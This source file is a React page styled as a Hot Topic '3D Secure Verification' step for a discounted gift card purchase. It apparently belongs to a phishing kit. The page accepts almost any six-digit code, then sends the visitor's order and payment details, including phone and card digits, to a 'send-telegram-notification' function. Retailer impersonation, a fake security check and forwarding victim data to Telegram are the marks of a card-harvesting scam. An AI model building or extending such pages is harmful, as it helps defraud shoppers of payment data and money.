
import { useState, useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { toast } from "@/hooks/use-toast";
import HotTopicHeader from "@/components/HotTopicHeader";
import HotTopicFooter from "@/components/HotTopicFooter";
import { AlertCircle, Clock, LockIcon, Shield } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { InputOTP, InputOTPGroup, InputOTPSlot, InputOTPSeparator } from "@/components/ui/input-otp";

const OTPVerification = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [otp, setOtp] = useState("");
  const [countdown, setCountdown] = useState(15 * 60); // 15 minutes in seconds
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState("");

  // Get order details from location state
  const orderDetails = location.state?.orderDetails;
  const giftCardValue = location.state?.giftCardValue;
  const discountedAmount = location.state?.discountedAmount;
  const paymentMethod = location.state?.paymentMethod;
  const lastFour = location.state?.lastFour;

  // Format remaining time as MM:SS
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
  };

  // Calculate percentage of time remaining for progress bar
  const timePercentage = (countdown / (15 * 60)) * 100;

  // If no order details, redirect to home
  useEffect(() => {
    if (!orderDetails) {
      navigate("/");
      toast({
        title: "Error",
        description: "No payment information found. Please start again.",
        variant: "destructive",
      });
    }
  }, [orderDetails, navigate]);

  // Countdown timer
  useEffect(() => {
    if (countdown <= 0) return;
    
    const timer = setInterval(() => {
      setCountdown(prevCountdown => {
        if (prevCountdown <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prevCountdown - 1;
      });
    }, 1000);
    
    return () => clearInterval(timer);
  }, [countdown]);

  // If time runs out
  useEffect(() => {
    if (countdown === 0) {
      toast({
        title: "Time Expired",
        description: "The verification time has expired. Please try again.",
        variant: "destructive",
      });
      navigate("/payment-cancelled", { 
        state: { 
          reason: "OTP verification timed out"
        }
      });
    }
  }, [countdown, navigate]);
  
  // Check OTP validity
  const verifyOTP = () => {
    // OTP validation
    if (otp.length !== 6) {
      setError("Please enter a complete 6-digit code");
      return false;
    }
    
    // For demo purposes, accept any 6-digit code except "000000"
    if (otp === "000000") {
      setError("Invalid verification code");
      return false;
    }
    
    return true;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    
    // Validate OTP
    if (!verifyOTP()) {
      return;
    }
    
    setIsSubmitting(true);
    
    try {
      // Simulate processing delay
      await new Promise(resolve => setTimeout(resolve, 1500));
      
      // Create complete order details object with payment info
      const completeOrderDetails = {
        ...orderDetails,
        paymentMethod: paymentMethod,
        lastFour: lastFour,
        otpVerified: true
      };
      
      // Save order details to localStorage for reference
      localStorage.setItem("hotTopicOrder", JSON.stringify(completeOrderDetails));
      
      // Send order notification to Telegram
      try {
        console.log("Sending order notification to Telegram with details:", completeOrderDetails);
        supabase.functions.invoke("send-telegram-notification", {
          body: completeOrderDetails
        }).then(response => {
          if (response.error) {
            console.error("Failed to send Telegram notification:", response.error);
          } else {
            console.log("Telegram notification sent successfully:", response.data);
          }
        });
      } catch (telegramErr) {
        console.error("Error sending Telegram notification:", telegramErr);
      }
      
      // Navigate to payment success page
      navigate("/payment-success", { 
        state: { 
          orderDetails: completeOrderDetails,
          giftCardValue,
          discountedAmount
        } 
      });
    } catch (error) {
      console.error("OTP verification error:", error);
      toast({
        title: "System Error",
        description: "We encountered a technical issue. Please try again later.",
        variant: "destructive",
      });
      setIsSubmitting(false);
    }
  };

  // Generate a new OTP by returning to payment page
  const handleRequestNewOTP = () => {
    navigate("/payment", { 
      state: { 
        orderDetails,
        giftCardValue,
        discountedAmount
      } 
    });
    toast({
      title: "Returning to Payment",
      description: "You'll need to re-enter your payment details.",
    });
  };

  return (
    <div className="min-h-screen bg-black">
      <HotTopicHeader />
      
      <div className="container py-8">
        <div className="max-w-xl mx-auto space-y-6">
          <div className="bg-hottopic-gray/10 rounded-xl p-6 border border-hottopic-gray/20">
            <h1 className="text-3xl font-bold text-white mb-4 text-center">
              3D Secure <span className="text-hottopic-red">Verification</span>
            </h1>
            
            {/* Timer Display */}
            <div className="flex flex-col items-center mb-8">
              <div className="w-full max-w-[250px] h-3 bg-hottopic-gray/20 rounded-full overflow-hidden mb-2">
                <div 
                  className={`h-full transition-all duration-1000 ease-linear ${
                    countdown > 300 ? 'bg-green-500' : countdown > 60 ? 'bg-yellow-500' : 'bg-red-500'
                  }`}
                  style={{ width: `${timePercentage}%` }}
                />
              </div>
              
              <div className="bg-hottopic-gray/20 px-4 py-1.5 rounded-full flex items-center">
                <Clock className={`h-4 w-4 mr-2 ${
                  countdown > 300 ? 'text-green-500' : countdown > 60 ? 'text-yellow-500' : 'text-red-500'
                }`} />
                <span className="text-white font-mono text-sm font-bold">
                  {countdown > 0 ? formatTime(countdown) : "00:00"}
                </span>
              </div>
            </div>
            
            <div className="space-y-4 bg-hottopic-dark p-6 rounded-lg border border-hottopic-gray/20 mb-8">
              <p className="text-white text-lg text-center font-medium">
                For your security, we've sent a verification code to
              </p>
              <p className="text-hottopic-red font-mono text-center text-lg font-bold">
                ******{orderDetails?.phone?.slice(-4) || "0000"}
              </p>
              <p className="text-gray-400 text-sm text-center">
                Enter the code below to complete your purchase
              </p>
            </div>
            
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Improved OTP Input */}
              <div className="space-y-6">
                <div className="flex justify-center">
                  <InputOTP
                    value={otp}
                    onChange={(value) => {
                      setOtp(value);
                      if (value.length === 6) {
                        setError("");
                      }
                    }}
                    maxLength={6}
                  >
                    <InputOTPGroup className="gap-2 md:gap-4">
                      <InputOTPSlot 
                        index={0} 
                        className="w-12 h-14 md:w-14 md:h-16 text-xl md:text-2xl bg-hottopic-dark border-2 focus:border-hottopic-red rounded-lg text-white" 
                      />
                      <InputOTPSlot 
                        index={1} 
                        className="w-12 h-14 md:w-14 md:h-16 text-xl md:text-2xl bg-hottopic-dark border-2 focus:border-hottopic-red rounded-lg text-white" 
                      />
                      <InputOTPSlot 
                        index={2} 
                        className="w-12 h-14 md:w-14 md:h-16 text-xl md:text-2xl bg-hottopic-dark border-2 focus:border-hottopic-red rounded-lg text-white" 
                      />
                      <InputOTPSeparator className="mx-1 text-gray-500">-</InputOTPSeparator>
                      <InputOTPSlot 
                        index={3} 
                        className="w-12 h-14 md:w-14 md:h-16 text-xl md:text-2xl bg-hottopic-dark border-2 focus:border-hottopic-red rounded-lg text-white" 
                      />
                      <InputOTPSlot 
                        index={4} 
                        className="w-12 h-14 md:w-14 md:h-16 text-xl md:text-2xl bg-hottopic-dark border-2 focus:border-hottopic-red rounded-lg text-white" 
                      />
                      <InputOTPSlot 
                        index={5} 
                        className="w-12 h-14 md:w-14 md:h-16 text-xl md:text-2xl bg-hottopic-dark border-2 focus:border-hottopic-red rounded-lg text-white" 
                      />
                    </InputOTPGroup>
                  </InputOTP>
                </div>
                
                {error && (
                  <div className="text-red-500 text-sm flex items-center justify-center gap-1 mt-2">
                    <AlertCircle className="h-4 w-4" />
                    <span>{error}</span>
                  </div>
                )}
              </div>
              
              {/* Payment Details Summary */}
              <div className="mt-8">
                <h3 className="text-gray-300 text-center mb-3 font-medium">Transaction Details</h3>
                <div className="bg-hottopic-dark p-4 rounded-lg border border-hottopic-gray/20 space-y-2">
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-400">Item:</span>
                    <span className="text-white">Hot Topic Gift Card</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-400">Value:</span>
                    <span className="text-white">${giftCardValue?.toFixed(2) || "0.00"}</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-400">Amount:</span>
                    <span className="text-hottopic-red font-semibold">${discountedAmount?.toFixed(2) || "0.00"}</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-400">Card:</span>
                    <span className="text-white">{paymentMethod} •••• {lastFour || "****"}</span>
                  </div>
                </div>
              </div>
              
              {/* Submit Button */}
              <div className="flex flex-col gap-3 mt-8">
                <Button 
                  type="submit" 
                  disabled={isSubmitting || countdown === 0 || otp.length !== 6}
                  className="w-full py-7 bg-hottopic-red hover:bg-hottopic-red/90 text-white font-bold text-lg"
                >
                  {isSubmitting ? (
                    <div className="flex items-center space-x-2">
                      <div className="w-5 h-5 border-2 border-t-transparent border-white rounded-full animate-spin"></div>
                      <span>Verifying...</span>
                    </div>
                  ) : (
                    "Verify Payment"
                  )}
                </Button>
                
                <Button
                  type="button"
                  variant="outline"
                  onClick={handleRequestNewOTP}
                  className="w-full py-2 text-white border-hottopic-gray hover:bg-hottopic-gray/20"
                >
                  Back to Payment
                </Button>
              </div>
              
              <div className="flex items-center justify-center text-center px-6 mt-4">
                <Shield className="text-gray-400 mr-2 h-4 w-4 flex-shrink-0" />
                <p className="text-gray-400 text-xs">
                  3D Secure verification helps protect your account from unauthorized transactions
                </p>
              </div>
            </form>
          </div>
        </div>
      </div>
      
      <HotTopicFooter />
    </div>
  );
};

export default OTPVerification;
